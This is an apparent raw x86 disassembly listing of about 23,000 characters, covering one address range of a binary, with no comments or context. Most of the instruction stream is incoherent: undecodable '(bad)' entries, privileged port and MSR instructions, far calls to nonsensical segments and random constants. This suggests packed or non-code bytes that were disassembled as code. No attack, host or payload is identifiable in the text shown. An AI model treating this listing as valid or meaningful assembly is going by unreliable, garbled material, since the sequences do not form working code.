  426f55:	pop    eax
  426f56:	pop    ecx
  426f57:	mov    ebp,0x9ee2c8b9
  426f5c:	sub    ebp,ebx
  426f5e:	gs cmp ebx,eax
  426f61:	jnp    0x426fa2
  426f63:	push   ss
  426f64:	sar    dl,cl
  426f66:	sbb    ch,dh
  426f68:	sbb    eax,0xce48c967
  426f6d:	aaa    
  426f6e:	daa    
  426f6f:	jns    0x426f11
  426f71:	mov    WORD PTR [ecx+edx*4-0x70636095],?
  426f78:	or     eax,0x38a776d5
  426f7e:	pshufw mm1,QWORD PTR [ebp+edx*8-0x6bc64cbc],0x60
  426f87:	mov    DWORD PTR [ebx-0x6e],0x99abde09
  426f8e:	lds    eax,FWORD PTR [eax+0x60]
  426f91:	repnz fsub st,st(6)
  426f94:	sub    eax,0xc3e532e
  426f99:	inc    esp
  426f9a:	cmc    
  426f9b:	fsub   st(1),st
  426f9d:	cmp    dh,dh
  426f9f:	and    ah,BYTE PTR [ebx+edi*4-0x1dbc135f]
  426fa6:	add    eax,0xd7cfde7f
  426fab:	lods   al,BYTE PTR ds:[esi]
  426fac:	lahf   
  426fad:	jp     0x42702b
  426faf:	mov    ch,0x87
  426fb1:	sbb    BYTE PTR [esi],dh
  426fb3:	int    0xc
  426fb5:	mov    al,0x65
  426fb7:	push   0x5a
  426fb9:	and    edx,DWORD PTR [eax-0x2d427052]
  426fbf:	mov    ah,0xea
  426fc1:	icebp  
  426fc2:	cmp    eax,DWORD PTR [ebx+0xe7cddcf]
  426fc8:	out    dx,eax
  426fc9:	out    0x1e,al
  426fcb:	and    cl,BYTE PTR [esi-0x3f]
  426fce:	mov    fs,WORD PTR [eax-0x4260d0b9]
  426fd4:	pop    es
  426fd5:	push   esp
  426fd6:	(bad)  
  426fd8:	sub    DWORD PTR [esi],ecx
  426fda:	mov    dl,0x76
  426fdc:	test   BYTE PTR [edx],0x67
  426fdf:	adc    dh,0x74
  426fe2:	lfs    esi,FWORD PTR [edx]
  426fe5:	movd   DWORD PTR [edx-0x7],mm2
  426fe9:	arpl   WORD PTR [edx-0x4e],bx
  426fec:	lods   al,BYTE PTR ds:[esi]
  426fed:	bound  edx,QWORD PTR [ebp-0x64fc60d6]
  426ff3:	and    al,0x6b
  426ff5:	and    al,bh
  426ff7:	mov    ebp,0x3a90836d
  426ffc:	les    esp,FWORD PTR [ebx+eiz*2-0x43]
  427000:	in     al,dx
  427001:	sbb    BYTE PTR [eax+0x500a65b0],dl
  427007:	fucom  st(3)
  427009:	ja     0x426f99
  42700b:	inc    ebx
  42700c:	outs   dx,DWORD PTR ds:[esi]
  42700d:	(bad)  
  42700e:	jg     0x426fb1
  427010:	and    eax,0x34c354f5
  427015:	inc    esp
  427016:	and    esi,DWORD PTR [ebp+0x6]
  427019:	sbb    BYTE PTR [ebp-0x5c],bl
  42701c:	int3   
  42701d:	and    dl,bh
  42701f:	inc    edx
  427020:	les    eax,FWORD PTR [ebp+eax*1-0x1147fd6b]
  427027:	retf   0x9f3d
  42702a:	arpl   bp,si
  42702c:	inc    edi
  42702d:	xchg   esi,eax
  42702e:	add    ch,BYTE PTR [ecx+0x61fb5195]
  427034:	shl    DWORD PTR [ebp-0x3236cdf0],cl
  42703a:	and    BYTE PTR [edx],bh
  42703c:	sbb    ebp,DWORD PTR [edx+0x67829aa7]
  427042:	adc    DWORD PTR [eax-0x6a],edi
  427045:	jg     0x426fd2
  427047:	dec    edx
  427048:	xor    esi,ebp
  42704a:	test   al,0xfe
  42704c:	sbb    al,0xbb
  42704e:	shl    BYTE PTR [ecx+0x38],1
  427051:	and    DWORD PTR [ebx-0x12],esi
  427054:	xchg   BYTE PTR ds:0xc591dec4,dh
  42705a:	in     eax,dx
  42705b:	jbe    0x42703b
  42705d:	and    ah,0xf9
  427060:	push   ebx
  427061:	(bad)  
  427062:	adc    eax,0x6761136a
  427067:	pop    esp
  427068:	lods   al,BYTE PTR ds:[esi]
  427069:	or     eax,0x77ea4951
  42706e:	or     BYTE PTR [ebp+0x4ef6aa09],0x63
  427075:	xor    ecx,esi
  427077:	mov    BYTE PTR [edx+0x55],dh
  42707a:	pop    esp
  42707b:	jne    0x4270bf
  42707d:	retf   0x6ffe
  427080:	cmp    eax,0x1ff5f77
  427085:	push   ecx
  427086:	inc    ebx
  427087:	call   0xc69b:0x42aa82a7
  42708e:	shr    DWORD PTR [edx-0x31],1
  427091:	fisubr DWORD PTR [ebx-0x68]
  427094:	mov    cl,0xc
  427096:	mov    cl,0xf5
  427098:	loop   0x4270b1
  42709a:	outs   dx,DWORD PTR ds:[esi]
  42709b:	addr16 in al,dx
  42709d:	jo     0x427103
  42709f:	(bad)  [ecx+0x5dbd59d2]
  4270a5:	push   ebp
  4270a6:	or     al,0x65
  4270a8:	fist   DWORD PTR [ebp+0x40]
  4270ab:	les    cx,DWORD PTR [ebp+0x1c4b85fa]
  4270b2:	ja     0x42709e
  4270b4:	xor    ah,bl
  4270b6:	cld    
  4270b7:	jb     0x42711b
  4270b9:	out    0xa,eax
  4270bb:	jne    0x4270dc
  4270bd:	stos   BYTE PTR es:[edi],al
  4270be:	call   0x744d:0xf683c756
  4270c5:	(bad)  
  4270c6:	ins    DWORD PTR es:[edi],dx
  4270c7:	and    esp,DWORD PTR [ecx]
  4270c9:	aas    
  4270ca:	fmul   st(1),st
  4270cc:	repz test BYTE PTR [ebx-0x79],dh
  4270d0:	and    al,0x53
  4270d2:	and    eax,0x26dbd121
  4270d7:	cmp    BYTE PTR [ecx-0x77],dh
  4270da:	pusha  
  4270db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270dc:	je     0x4270e1
  4270de:	mov    ecx,0x33ed7db1
  4270e3:	aaa    
  4270e4:	popf   
  4270e5:	fcom   DWORD PTR [edx+0x78d3acec]
  4270eb:	fmul   st(6),st
  4270ed:	or     eax,0xd4ccca88
  4270f2:	fimul  DWORD PTR [eax-0x4c97eb4d]
  4270f8:	push   edi
  4270f9:	rcl    DWORD PTR cs:[eax-0x6c],cl
  4270fd:	es loop 0x42715d
  427100:	mov    bl,0x13
  427102:	or     al,0x1b
  427104:	cmc    
  427105:	arpl   WORD PTR [eax],sp
  427107:	xor    bl,dh
  427109:	xor    BYTE PTR [ecx],al
  42710b:	shr    ah,0x49
  42710e:	(bad)  
  427110:	xor    BYTE PTR [ebx],dl
  427112:	fild   WORD PTR [edx]
  427114:	jle    0x4270db
  427116:	in     al,dx
  427117:	stc    
  427118:	lock cli 
  42711a:	or     DWORD PTR [edx+0x450a839c],esp
  427120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427121:	(bad)  
  427122:	div    DWORD PTR [eax]
  427124:	shl    BYTE PTR [ecx+0x7e596599],0xb5
  42712b:	stos   DWORD PTR es:[edi],eax
  42712c:	mov    edi,0x41b8514f
  427131:	mov    eax,0xa103af2d
  427136:	sbb    al,0x95
  427138:	xchg   ebp,eax
  427139:	mov    dh,0x2d
  42713b:	test   BYTE PTR [edi+0x78695de6],bh
  427141:	adc    edi,DWORD PTR [edi+0x2ac2a928]
  427147:	sbb    bh,BYTE PTR [edx]
  427149:	mov    eax,0x18bde0bc
  42714e:	push   ecx
  42714f:	push   cs
  427150:	inc    ecx
  427151:	pop    eax
  427152:	pop    ebp
  427153:	and    BYTE PTR [edx+0x24],bl
  427156:	fiadd  WORD PTR [ecx]
  427158:	fld    QWORD PTR [ebx]
  42715a:	popa   
  42715b:	inc    ebp
  42715c:	aam    0xd6
  42715e:	not    DWORD PTR ds:0x322879b
  427164:	xchg   BYTE PTR [edx+0x33],dl
  427167:	mov    al,0xc8
  427169:	imul   ebx,edi,0x21
  42716c:	sub    bh,bh
  42716e:	repnz dec ebp
  427170:	dec    ebp
  427171:	adc    eax,0xcb7f54d
  427176:	dec    esi
  427177:	aad    0x1e
  427179:	in     eax,dx
  42717a:	fild   WORD PTR [eax+0x24]
  42717d:	inc    ebx
  42717e:	call   0x6600:0x5e1f2e46
  427185:	xchg   BYTE PTR [ecx],cl
  427187:	outs   dx,DWORD PTR ds:[esi]
  427188:	jb     0x42715b
  42718a:	xchg   DWORD PTR [edx-0x30],esp
  42718d:	bound  ebx,QWORD PTR [ecx-0x75]
  427190:	outs   dx,BYTE PTR ds:[esi]
  427191:	leave  
  427192:	mov    ecx,0x331d3f01
  427197:	cwde   
  427198:	test   eax,0xc3b914c6
  42719d:	inc    ecx
  42719e:	adc    DWORD PTR [ebp+0x56],0x4c
  4271a2:	test   al,0x86
  4271a4:	stc    
  4271a5:	sbb    DWORD PTR [edx*2-0x22670a51],ecx
  4271ac:	mov    dh,0xcc
  4271ae:	and    BYTE PTR cs:[ebx+eiz*2-0x14],dh
  4271b3:	mov    bh,bh
  4271b5:	nop
  4271b6:	fxch   st(4)
  4271b8:	jo     0x42714f
  4271ba:	sbb    BYTE PTR [ecx+0x534e1aba],dh
  4271c0:	xor    BYTE PTR [edi],bl
  4271c2:	add    BYTE PTR [esi+ebx*2-0xe],ah
  4271c6:	push   edi
  4271c7:	pop    edi
  4271c8:	inc    esp
  4271c9:	pop    ebx
  4271ca:	mov    dh,0x13
  4271cc:	cmp    esp,DWORD PTR [ecx+0x6888db4d]
  4271d2:	mov    dl,0xc5
  4271d4:	adc    ah,BYTE PTR [ebx-0x36abb26f]
  4271da:	jbe    0x42723d
  4271dc:	fisttp WORD PTR [edi-0x4f]
  4271df:	repz sti 
  4271e1:	aam    0xb0
  4271e3:	jne    0x42721b
  4271e5:	dec    ebx
  4271e6:	fld    TBYTE PTR [ebx]
  4271e8:	push   edx
  4271e9:	push   edx
  4271ea:	sbb    eax,0x6a9625f9
  4271ef:	icebp  
  4271f0:	mov    BYTE PTR [ebx+0x5d],ch
  4271f3:	inc    esi
  4271f4:	mov    esi,0xd55242b2
  4271f9:	xor    edx,esp
  4271fb:	sub    edi,DWORD PTR [ecx+edx*2+0x29]
  4271ff:	retf   
  427200:	dec    edx
  427201:	call   0x14dc9fa1
  427206:	data16 rcr BYTE PTR [ebx+esi*8+0x7e95ada5],1
  42720e:	mov    BYTE PTR [eax-0x3c0ed8b6],0x7e
  427215:	rcr    BYTE PTR [ebx],1
  427217:	hlt    
  427218:	enter  0x5be8,0x8b
  42721c:	fwait
  42721d:	rcr    BYTE PTR [ebx+0x7d],cl
  427220:	mov    eax,ds:0x1e855a17
  427225:	daa    
  427226:	add    bh,BYTE PTR [edi+0x5c]
  427229:	into   
  42722a:	cmp    al,0x64
  42722c:	jno    0x4271ed
  42722e:	xor    dl,BYTE PTR [ebx+0x6d]
  427231:	scas   al,BYTE PTR es:[edi]
  427232:	sub    eax,0xdce2470b
  427237:	jne    0x427204
  427239:	retf   
  42723a:	xchg   esp,eax
  42723b:	or     eax,0x4d79e19d
  427240:	nop
  427241:	imul   edi,DWORD PTR [eax+ebx*4],0xba7a789
  427248:	fiadd  WORD PTR [edi+eax*8]
  42724b:	arpl   WORD PTR [esi+0x2b],ax
  42724e:	add    DWORD PTR ds:0xa2c20df1,ebx
  427254:	ret    
  427255:	cmc    
  427256:	mov    edx,DWORD PTR [ebx]
  427258:	dec    esp
  427259:	imul   ebp,DWORD PTR [ebx+0x42],0xffffff90
  42725d:	or     al,0x84
  42725f:	mov    al,0x3b
  427261:	inc    ebp
  427262:	retf   
  427263:	push   ecx
  427264:	outs   dx,BYTE PTR ds:[esi]
  427265:	mov    cl,0xef
  427267:	pop    es
  427268:	sub    ah,BYTE PTR [edx-0x74650288]
  42726e:	ja     0x427202
  427270:	cmc    
  427271:	or     edi,DWORD PTR [edi+0x59]
  427274:	out    dx,al
  427275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427276:	cmp    DWORD PTR [edx+0x213a9677],0x5f
  42727d:	js     0x4272f8
  42727f:	sbb    bh,BYTE PTR [ebx+0x5a596f64]
  427285:	mov    al,ds:0xcde39fd8
  42728a:	ja     0x4272e3
  42728c:	test   eax,0x4f7511cf
  427291:	js     0x4272a8
  427293:	arpl   WORD PTR [esi+0x2419c6ba],bp
  427299:	jmp    0x320f:0x2fbdd667
  4272a0:	in     eax,dx
  4272a1:	mov    eax,0x5389f213
  4272a6:	outs   dx,DWORD PTR ds:[esi]
  4272a7:	ins    BYTE PTR es:[edi],dx
  4272a8:	sub    BYTE PTR [esi+eax*1],cl
  4272ab:	mov    ebx,0xd766018d
  4272b0:	call   0x41a02eea
  4272b5:	cld    
  4272b6:	outs   dx,DWORD PTR ds:[esi]
  4272b7:	push   ss
  4272b8:	lods   al,BYTE PTR ds:[esi]
  4272b9:	clc    
  4272ba:	(bad)  
  4272bb:	xchg   esi,eax
  4272bc:	(bad)  
  4272bd:	test   DWORD PTR [edx+0x6724f343],0xe4fb9ad5
  4272c7:	js     0x42730b
  4272c9:	stc    
  4272ca:	int    0x3a
  4272cc:	ret    
  4272cd:	stos   DWORD PTR es:[edi],eax
  4272ce:	push   cs
  4272cf:	fsub   QWORD PTR [eax-0x591e6764]
  4272d5:	mov    ebx,DWORD PTR [ebx-0x25]
  4272d8:	sti    
  4272d9:	xchg   esi,eax
  4272da:	fldcw  WORD PTR [eax+edi*8]
  4272dd:	push   edi
  4272de:	jge    0x4272a1
  4272e0:	(bad)  
  4272e1:	repz pop ebx
  4272e3:	push   esi
  4272e4:	push   edi
  4272e5:	aad    0x12
  4272e7:	sub    ebp,esi
  4272e9:	jl     0x427344
  4272eb:	scas   eax,DWORD PTR es:[edi]
  4272ec:	push   es
  4272ed:	scas   eax,DWORD PTR es:[edi]
  4272ee:	jno    0x427317
  4272f0:	(bad)  
  4272f1:	scas   al,BYTE PTR es:[edi]
  4272f2:	adc    bl,ch
  4272f4:	jne    0x4272ad
  4272f6:	das    
  4272f7:	fisttp DWORD PTR [ecx+eax*2+0x7b3df262]
  4272fe:	mov    al,ds:0xbda8d5a8
  427303:	push   ecx
  427304:	(bad)  
  427306:	push   ds
  427307:	fnstcw WORD PTR [esi+0x56]
  42730a:	jo     0x4272ba
  42730c:	xchg   ecx,eax
  42730d:	imul   edi,DWORD PTR ds:0xcde3253a,0x3c209dac
  427317:	ret    
  427318:	scas   al,BYTE PTR es:[edi]
  427319:	mov    WORD PTR [edi+0x69],es
  42731c:	out    0x38,eax
  42731e:	cld    
  42731f:	sub    BYTE PTR [esi-0x70d567b3],al
  427325:	mov    bh,bh
  427327:	loop   0x4273a6
  427329:	lods   al,BYTE PTR ds:[esi]
  42732a:	mov    al,0xcc
  42732c:	popf   
  42732d:	xchg   ecx,eax
  42732e:	or     DWORD PTR [edi],ebx
  427330:	sub    eax,0x2d78db4e
  427335:	lahf   
  427336:	imul   edx,DWORD PTR [edi],0x3e
  427339:	or     bl,ah
  42733b:	push   ecx
  42733c:	inc    esp
  42733d:	sbb    ebx,DWORD PTR [ebx+esi*4+0x59]
  427341:	ret    0x928f
  427344:	pop    ds
  427345:	stos   DWORD PTR es:[edi],eax
  427346:	ins    BYTE PTR es:[edi],dx
  427347:	test   DWORD PTR [ecx+ebx*8],edx
  42734a:	mov    DWORD PTR [eax],edi
  42734c:	aam    0x82
  42734e:	add    ch,dh
  427350:	rcr    BYTE PTR [edx+0x3],1
  427353:	out    dx,al
  427354:	jmp    esp
  427356:	leave  
  427357:	adc    al,0xdc
  427359:	mov    ch,0xf2
  42735b:	(bad)  
  42735c:	xchg   ecx,eax
  42735d:	stos   DWORD PTR es:[edi],eax
  42735e:	fisubr WORD PTR [edi]
  427360:	call   0x164f101d
  427365:	cwde   
  427366:	cmp    dh,BYTE PTR [eax+ebp*1]
  427369:	sub    eax,0x76c17ac9
  42736e:	fadd   DWORD PTR [edx]
  427370:	enter  0xf595,0x18
  427374:	cmp    DWORD PTR ss:[ebp+edx*8+0x5c3c36c5],0x180a3bbe
  427380:	jo     0x42737b
  427382:	sub    ah,dh
  427384:	cli    
  427385:	push   esi
  427386:	fwait
  427387:	test   ebx,ecx
  427389:	aas    
  42738a:	adc    al,BYTE PTR [eax+ecx*8-0x71]
  42738e:	cmp    DWORD PTR [ebp+0x6c],edi
  427391:	jp     0x42738e
  427393:	das    
  427394:	pop    ebp
  427395:	lock pop edx
  427397:	out    0xec,al
  427399:	fdiv   DWORD PTR [edx]
  42739b:	(bad)  
  42739c:	and    al,0x81
  42739e:	or     ebx,DWORD PTR [ebp+0x2a]
  4273a1:	daa    
  4273a2:	loopne 0x4273c1
  4273a4:	nop
  4273a5:	jecxz  0x427360
  4273a7:	shl    DWORD PTR [ecx-0x1fafeb77],1
  4273ad:	iret   
  4273ae:	mov    edx,0x44dcec4a
  4273b3:	mov    edi,DWORD PTR [esi+0x43]
  4273b6:	add    al,0x18
  4273b8:	loopne 0x4273dc
  4273ba:	pop    ss
  4273bb:	add    eax,0x276dceb8
  4273c0:	or     edx,DWORD PTR [edx-0x7bcb711a]
  4273c6:	adc    al,0xe6
  4273c8:	into   
  4273c9:	push   0xffffffca
  4273cb:	sbb    eax,0x5c527c05
  4273d0:	cwde   
  4273d1:	mov    esi,0xd1fd2d82
  4273d6:	xchg   edi,eax
  4273d7:	jecxz  0x4273bc
  4273d9:	cmc    
  4273da:	adc    BYTE PTR [esi+0x15],bh
  4273dd:	retfw  0xcbfd
  4273e1:	or     ebx,DWORD PTR [esi]
  4273e3:	jns    0x427376
  4273e5:	push   ebp
  4273e6:	adc    eax,0x1aff6b55
  4273eb:	sbb    eax,esi
  4273ed:	sbb    ebp,DWORD PTR [edx+ebp*1-0x7aa7f087]
  4273f4:	fsubr  QWORD PTR [eax]
  4273f6:	pop    esp
  4273f7:	aad    0xf3
  4273f9:	fwait
  4273fa:	jns    0x427382
  4273fc:	push   ds
  4273fd:	or     ecx,ebp
  4273ff:	es clc 
  427401:	lds    esp,FWORD PTR ds:0xdd0731ae
  427407:	fsubr  QWORD PTR gs:[eax+0x47]
  42740b:	or     DWORD PTR [ebp-0x1b001fd3],0x68
  427412:	xor    ebx,DWORD PTR fs:[di+0x6d32]
  427418:	fild   QWORD PTR [ecx]
  42741a:	jg     0x42740b
  42741c:	push   esi
  42741d:	(bad)
  427420:	in     eax,dx
  427421:	out    dx,al
  427422:	outs   dx,BYTE PTR ds:[esi]
  427423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427424:	imul   esp,DWORD PTR [edx],0x8dd7e538
  42742a:	sub    bh,BYTE PTR [ebx+ecx*1]
  42742d:	add    DWORD PTR [eax],esi
  42742f:	pop    edi
  427430:	xchg   BYTE PTR [edi],bh
  427432:	and    DWORD PTR [ebx-0x5741521f],ecx
  427438:	pop    ss
  427439:	jae    0x42741b
  42743b:	xchg   ecx,eax
  42743c:	and    eax,0x9cd69e08
  427441:	sbb    cl,BYTE PTR [ebx+0x4ca646a4]
  427447:	mov    eax,0x6e0bc2c8
  42744c:	sbb    al,0x58
  42744e:	stos   DWORD PTR es:[edi],eax
  42744f:	clc    
  427450:	dec    eax
  427451:	mov    ecx,DWORD PTR [edx-0x38f2da16]
  427457:	pop    esi
  427458:	stc    
  427459:	outs   dx,BYTE PTR ds:[esi]
  42745a:	sti    
  42745b:	or     al,0x80
  42745d:	or     DWORD PTR [esi-0x59],edx
  427460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427461:	ret    
  427462:	sti    
  427463:	imul   edi,DWORD PTR [eax-0x7c57f313],0x1e
  42746a:	cmp    ecx,esp
  42746c:	clc    
  42746d:	outs   dx,BYTE PTR ds:[esi]
  42746e:	out    0x9d,al
  427470:	pop    eax
  427471:	(bad)  
  427472:	fisub  WORD PTR ds:0xf6e739c3
  427478:	xchg   BYTE PTR [eax],bh
  42747a:	inc    esi
  42747b:	rcl    DWORD PTR [ebx],0xa6
  42747e:	mov    ah,0xac
  427480:	mov    ecx,0xb18b7f83
  427485:	jne    0x427411
  427487:	pushf  
  427488:	popa   
  427489:	add    BYTE PTR [ebp+0x55],cl
  42748c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427492:	mov    esp,ebp
  427494:	or     al,ah
  427496:	dec    ebp
  427497:	add    bh,al
  427499:	add    BYTE PTR [eax],cl
  42749b:	add    BYTE PTR [eax],al
  42749d:	mov    DWORD PTR [eax],0x3ef44545
  4274a3:	cmp    BYTE PTR [eax],al
  4274a5:	test   DWORD PTR [ebx-0x34070b64],ecx
  4274ab:	(bad)  
  4274ac:	enter  0x4d45,0xb8
  4274b0:	mov    edi,DWORD PTR [ecx]
  4274b2:	hlt    
  4274b3:	test   ebx,ecx
  4274b5:	pushf  
  4274b6:	enter  0x4df8,0x8b
  4274ba:	mov    DWORD PTR [ebp+0x8],0x894708
  4274c1:	inc    ebp
  4274c2:	mov    ebp,0xff8bfffc
  4274c7:	dec    ebp
  4274c8:	mov    ch,0xf4
  4274ca:	call   DWORD PTR [ebx-0x1]
  4274cd:	mov    ebx,0x8005022
  4274d2:	call   DWORD PTR [ecx+0x8]
  4274d5:	pop    es
  4274d6:	jmp    0xb8:0x9cb4533
  4274dd:	cwde   
  4274de:	mov    esi,DWORD PTR [edx-0xc]
  4274e1:	xor    al,bl
  4274e3:	add    BYTE PTR [eax+0x3c83203],bl
  4274e9:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  4274ef:	mov    eax,DWORD PTR [ebx-0xb87b3]
  4274f5:	xor    eax,DWORD PTR [eax]
  4274f7:	retf   
  4274f8:	ret    
  4274f9:	add    eax,esi
  4274fb:	enter  0x8945,0x64
  4274ff:	dec    ebp
  427500:	sbb    ah,cl
  427502:	add    BYTE PTR [ebx-0xb87b277],cl
  427508:	dec    DWORD PTR [ebx-0xbcfb275]
  42750e:	test   DWORD PTR [ebx],esi
  427510:	dec    ebx
  427512:	inc    DWORD PTR [ebx]
  427514:	inc    eax
  427515:	enter  0x8989,0x64
  427519:	(bad)  
  42751a:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  42751e:	cld    
  42751f:	dec    DWORD PTR [ebp-0xa90001]
  427525:	push   edi
  427526:	mov    BYTE PTR [edx+0x1],ch
  427529:	and    BYTE PTR [eax],al
  42752b:	pop    ecx
  42752c:	inc    ebp
  42752d:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  427533:	push   0xffffff89
  427535:	pop    ecx
  427536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427537:	dec    ebp
  427538:	add    BYTE PTR [ecx+0x45fc088b],cl
  42753e:	jne    0x427588
  427540:	lea    eax,[eax]
  427542:	fs (bad) 
  427544:	dec    DWORD PTR [eax]
  427546:	mov    DWORD PTR [eax],eax
  427548:	test   al,0x0
  42754a:	add    BYTE PTR [ebp-0x18],cl
  42754d:	xor    ebp,DWORD PTR [edx]
  42754f:	add    eax,DWORD PTR [eax]
  427551:	mov    eax,eax
  427553:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  42755a:	inc    ebp
  42755b:	mov    DWORD PTR [ebx+0x459408],ecx
  427561:	popa   
  427562:	mov    esp,DWORD PTR [ebp-0x75]
  427565:	(bad)  
  427566:	cld    
  427567:	inc    eax
  427568:	cmp    bh,0x1
  42756b:	lea    eax,[eax]
  42756d:	and    BYTE PTR [eax],al
  42756f:	inc    DWORD PTR [ecx-0x18]
  427572:	mov    ecx,DWORD PTR [ebx]
  427574:	cld    
  427575:	add    BYTE PTR [ecx+0x75014d],cl
  42757b:	(bad)  
  42757c:	xchg   ebp,eax
  42757d:	sar    bh,1
  42757f:	inc    eax
  427580:	inc    DWORD PTR [eax]
  427582:	mov    eax,DWORD PTR [ebp-0x4]
  427585:	xor    edx,DWORD PTR [edx+0x7201be]
  42758b:	add    BYTE PTR [edx],dl
  42758d:	(bad)  
  42758e:	nop
  42758f:	inc    ebp
  427590:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427596:	mov    al,0xff
  427598:	add    bh,bh
  42759a:	add    BYTE PTR [ebx],dh
  42759c:	inc    DWORD PTR [ebx]
  42759e:	sbb    al,0x89
  4275a0:	jne    0x42757e
  4275a2:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4275a8:	mov    eax,DWORD PTR [ebp-0xff0048]
  4275ae:	mov    DWORD PTR [eax-0x70],0xee70ed89
  4275b5:	inc    DWORD PTR [ebp-0x75]
  4275b8:	fisttp QWORD PTR [eax+ebp*8]
  4275bb:	test   DWORD PTR [esi-0x1],esp
  4275be:	inc    ebp
  4275bf:	(bad)  
  4275c0:	aas    
  4275c1:	inc    ebp
  4275c2:	(bad)  
  4275c3:	lea    edi,[eax+edi*2-0x1]
  4275c7:	inc    edi
  4275c9:	mov    DWORD PTR ds:0x8000c7a0,edi
  4275cf:	mov    ebp,esi
  4275d1:	cld    
  4275d2:	in     al,0x8d
  4275d4:	inc    ebp
  4275d5:	(bad)  
  4275d6:	call   0xc7cb55da
  4275db:	add    DWORD PTR [eax-0x11ba1500],ecx
  4275e1:	inc    DWORD PTR [ebp-0x4]
  4275e4:	out    0x8d,eax
  4275e6:	aas    
  4275e7:	(bad)  
  4275e8:	call   0xcaa0ec
  4275ed:	add    DWORD PTR [ebx-0x7f570400],ecx
  4275f3:	add    BYTE PTR [ecx],al
  4275f5:	test   DWORD PTR [eax],eax
  4275f7:	wrmsr  
  4275f9:	jae    0x4275e8
  4275fb:	add    BYTE PTR [eax],al
  4275fd:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  427603:	add    esp,edi
  427605:	add    BYTE PTR [eax+0x450108],al
  42760b:	mov    edi,DWORD PTR [ebp-0x6c]
  42760e:	add    DWORD PTR [eax],0x4
  427611:	mov    eax,DWORD PTR [ebp+0x3]
  427614:	mov    edi,DWORD PTR [esp+edi*8]
  427617:	dec    ebp
  427618:	nop
  427619:	mov    eax,DWORD PTR [ecx]
  42761b:	fadd   DWORD PTR [eax]
  42761d:	add    BYTE PTR [esi],al
  42761f:	lea    eax,[eax]
  427621:	pusha  
  427622:	push   eax
  427623:	inc    DWORD PTR [ebp+0x52]
  427626:	call   DWORD PTR [ebp-0x7b]
  427629:	mov    esi,DWORD PTR [ebp-0x74]
  42762c:	mov    eax,DWORD PTR [eax]
  42762e:	cld    
  42762f:	mov    eax,DWORD PTR [eax+0x880103]
  427635:	add    BYTE PTR [ebp+0x6a],bh
  427638:	cmp    edi,0x10
  42763b:	mov    WORD PTR [ebp+0x0],es
  42763e:	mov    edx,DWORD PTR [edx-0x4]
  427641:	push   ecx
  427642:	nop
  427643:	inc    DWORD PTR [ecx]
  427645:	cld    
  427646:	add    BYTE PTR [ebp-0x24],bh
  427649:	mov    eax,DWORD PTR [eax]
  42764b:	cld    
  42764c:	push   eax
  42764d:	nop
  42764e:	inc    ebp
  42764f:	add    edi,edi
  427651:	add    BYTE PTR [ebx+0x4de4f445],cl
  427657:	in     al,dx
  427658:	xor    eax,edi
  42765a:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427661:	mov    DWORD PTR [eax],0xb8788b98
  427667:	test   ebx,eax
  427669:	jmp    FWORD PTR [eax-0x1]
  42766c:	int    0xed
  42766e:	sub    esp,eax
  427670:	add    eax,DWORD PTR [ebp-0x30]
  427673:	fild   WORD PTR [ebp+0x3f]
  427676:	cmp    eax,edi
  427678:	je     0xca43569a
  42767e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427685:	(bad)  
  427686:	jne    0x427614
  427688:	mov    ebx,ebp
  42768a:	cld    
  42768b:	js     0x4276d2
  42768d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427693:	inc    ebp
  427694:	call   0xeaa024
  427699:	add    BYTE PTR [ebx-0x7f170301],cl
  42769f:	add    DWORD PTR es:[eax],eax
  4276a2:	add    al,al
  4276a4:	xor    BYTE PTR [eax+0x41],dl
  4276a7:	inc    ebp
  4276a8:	add    BYTE PTR [ebx+0xfcd88b],cl
  4276ae:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  4276b4:	add    DWORD PTR [ecx+0x458be845],ecx
  4276ba:	fmul   DWORD PTR [ebx+0x8bb800]
  4276c0:	cld    
  4276c1:	call   0xd7a186
  4276c6:	dec    DWORD PTR [ebx+0x1090e8ff]
  4276cc:	add    al,al
  4276ce:	push   eax
  4276cf:	es inc ebp
  4276d1:	inc    ebp
  4276d2:	mov    ecx,DWORD PTR [ebx+0xd89c]
  4276d8:	dec    DWORD PTR [ebx-0x3ff70301]
  4276de:	mov    DWORD PTR gs:[eax],eax
  4276e1:	call   0x8b6abca6
  4276e6:	inc    ebp
  4276e7:	mov    eax,0xe8d8008b
  4276ec:	add    BYTE PTR [ecx],ch
  4276ee:	mov    eax,DWORD PTR [eax]
  4276f0:	cld    
  4276f1:	mov    eax,eax
  4276f3:	call   0x462a874d
  4276f8:	sub    DWORD PTR [ebx-0x3c743000],ecx
  4276fe:	cld    
  4276ff:	mov    BYTE PTR [eax+0x8401c1],0x1
  427706:	xor    BYTE PTR [eax],al
  427708:	push   edi
  427709:	inc    ebp
  42770a:	mov    DWORD PTR [ebx],esi
  42770c:	in     al,0xb9
  42770e:	inc    ebp
  42770f:	lea    ecx,[ebx-0x3c370301]
  427715:	dec    ebp
  427716:	cwde   
  427717:	mov    esi,DWORD PTR [edx]
  427719:	or     BYTE PTR [ebx],al
  42771b:	ror    DWORD PTR [ebp-0xfebf79],0x0
  427722:	call   0x42a06c
  427727:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  42772d:	jge    0x427762
  42772f:	mov    eax,DWORD PTR [ebx]
  427731:	cld    
  427732:	lea    edx,[eax+0xff0120]
  427738:	call   0x42a0cc
  42773d:	push   eax
  42773e:	inc    DWORD PTR [ebp-0x1c]
  427741:	mov    ecx,DWORD PTR [ebp-0x58]
  427744:	xor    eax,DWORD PTR [eax]
  427746:	add    edi,edi
  427748:	cmp    ebp,eax
  42774a:	jne    0x427772
  42774c:	mov    DWORD PTR [eax],0x8b004dd8
